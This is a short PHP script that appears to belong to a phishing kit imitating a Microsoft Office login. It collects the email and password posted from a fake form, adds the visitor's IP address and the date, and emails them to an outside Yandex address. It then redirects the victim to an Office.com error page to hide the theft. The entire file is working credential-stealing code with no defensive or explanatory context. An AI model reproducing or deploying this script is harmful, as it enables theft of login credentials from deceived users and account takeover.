<?
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------------CP-----------------------\n";
$message .= "User            : ".$_POST['email']."\n";
$message .= "Password            : ".$_POST['password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "-------SMILE------\n";
$send = "trainsoul203@yandex.com";
$subject = "OFF - $ip";
$headers = "From: OFF<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
header("Location: https://www.office.com/error");
?>